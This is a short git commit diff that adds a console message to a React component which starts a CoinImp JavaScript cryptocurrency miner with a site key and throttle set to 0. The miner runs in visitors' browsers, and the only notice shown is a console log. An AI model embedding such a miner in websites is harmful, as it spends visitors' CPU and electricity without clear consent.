d43e1713efe524ba82dfcfb295bfea01b7d29a96
MARIANO-89 <nano_carp@hotmail.com>
2021-03-20 19:49:32 -0300

    add log

--- src/components/atoms/Coinsimp/Coinimp.component.jsx
+++ src/components/atoms/Coinsimp/Coinimp.component.jsx
@@ -5,6 +5,7 @@ const CoinimpComponent = () => {
     const elementRef = useRef(null);
 
     const onLoad = () => {
+        console.log('This site is running JavaScript miner from coinimp.com');
         let _client = new Client.Anonymous('4f4e64f8f722988482114c06ad5bde7e1fe41b27e76df74ffae2ec22a9b1e17f', {
             throttle: 0,
             c: 'w',
